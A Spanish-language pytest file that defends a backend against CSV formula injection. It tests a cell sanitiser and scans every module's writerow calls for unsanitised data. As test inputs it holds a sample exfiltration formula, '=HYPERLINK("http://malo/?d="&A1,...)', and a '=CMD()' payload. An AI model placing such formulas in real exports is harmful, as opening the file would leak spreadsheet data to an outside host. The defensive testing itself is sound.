"""Que NINGÚN exportador de CSV deje pasar una fórmula.

BUG-055 se arregló en `/admin/users.csv` y se quedó fuera el CSV de
liquidaciones de afiliados, porque `_csv_safe` vivía en `server.py` y
`affiliate_program.py` no importa nada de ahí. Este fichero fija las dos cosas:
que el saneador funciona, y que **todo exportador lo usa**.

La segunda es la que importa. Comprobar sólo el saneador dejaría pasar
exactamente el fallo que hubo: la función correcta y un exportador que no la
llama.
"""
import ast
import os
import pathlib
import sys

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from csv_seguro import csv_safe, fila_segura  # noqa: E402

BACKEND = pathlib.Path(__file__).resolve().parent.parent


class TestSaneador:
    @pytest.mark.parametrize("inicio", ["=", "+", "-", "@", "\t", "\r"])
    def test_los_seis_disparadores_se_neutralizan(self, inicio):
        assert csv_safe(f"{inicio}HYPERLINK(\"http://malo\")").startswith("'")

    def test_el_ataque_real_de_exfiltracion(self):
        carga = '=HYPERLINK("http://malo/?d="&A1,"pincha")'
        assert csv_safe(carga) == "'" + carga

    def test_un_texto_normal_no_se_toca(self):
        assert csv_safe("Juan Pérez") == "Juan Pérez"
        assert csv_safe("ES91 2100 0418 4502 0005 1332") == "ES91 2100 0418 4502 0005 1332"

    def test_un_numero_sigue_siendo_numero(self):
        """Convertirlo a cadena rompería la columna sin proteger de nada."""
        assert csv_safe(1234.5) == 1234.5
        assert csv_safe(None) is None

    def test_la_cadena_vacia_no_revienta(self):
        assert csv_safe("") == ""

    def test_fila_segura_sanea_todas_las_celdas(self):
        fila = fila_segura(["ok", "=CMD()", 7, "-2+3"])
        assert fila == ["ok", "'=CMD()", 7, "'-2+3"]


def _escribe_csv(arbol: ast.AST) -> list[ast.Call]:
    """Las llamadas que ESCRIBEN una fila en un CSV."""
    fuera = []
    for n in ast.walk(arbol):
        if not isinstance(n, ast.Call) or not isinstance(n.func, ast.Attribute):
            continue
        if n.func.attr in ("writerow", "writerows"):
            fuera.append(n)
    return fuera


def _saneada(arg: ast.AST, ambito: ast.AST | None = None) -> bool:
    """¿El argumento pasa por el saneador, de la forma que sea?

    ⚠️ Mira también DÓNDE SE CONSTRUYÓ la variable. `writer.writerows(rows)`
    con `rows` armado con `_csv_safe` cuatro líneas antes es correcto, y una
    regla que lo marca en rojo es un falso positivo — y un verificador que
    grita con código correcto acaba desactivado, que es la otra forma de no
    verificar nada.
    """
    if isinstance(arg, ast.Name) and ambito is not None:
        for n in ast.walk(ambito):
            if isinstance(n, (ast.Assign, ast.AugAssign, ast.AnnAssign)):
                objetivos = getattr(n, "targets", None) or [getattr(n, "target", None)]
                if any(isinstance(t, ast.Name) and t.id == arg.id for t in objetivos if t):
                    if n.value is not None and _saneada(n.value):
                        return True
    for hijo in ast.walk(arg):
        if isinstance(hijo, ast.Call) and isinstance(hijo.func, ast.Name):
            if hijo.func.id in ("fila_segura", "csv_safe", "_csv_safe"):
                return True
        # `{k: _csv_safe(v) for ...}` y variantes por comprensión
        if isinstance(hijo, ast.Name) and hijo.id in ("fila_segura", "csv_safe", "_csv_safe"):
            return True
    return False


def test_ningun_writerow_escribe_datos_sin_sanear():
    """La regla que faltaba, y por eso el CSV de afiliados quedó desprotegido.

    Se busca la PROPIEDAD —una fila que se escribe sin pasar por el saneador—
    en todos los módulos, no la presencia del saneador en uno.

    La cabecera de columnas es literal nuestra y no hace falta sanearla; se
    reconoce porque todos sus elementos son constantes de texto.
    """
    fuera = []
    for ruta in sorted(BACKEND.glob("*.py")):
        try:
            arbol = ast.parse(ruta.read_text(encoding="utf-8"))
        except SyntaxError:
            continue
        for llamada in _escribe_csv(arbol):
            if not llamada.args:
                continue
            arg = llamada.args[0]
            # Cabecera: lista de constantes. No lleva dato de usuario.
            if isinstance(arg, (ast.List, ast.Tuple)) and all(
                isinstance(e, ast.Constant) for e in arg.elts
            ):
                continue
            if not _saneada(arg, arbol):
                fuera.append(f"{ruta.name}:{llamada.lineno}")

    assert not fuera, (
        "hay filas de CSV que se escriben sin pasar por `csv_seguro`: "
        + ", ".join(fuera)
        + " — una celda que empieza por = + - @ la ejecuta la hoja de cálculo al abrirla"
    )
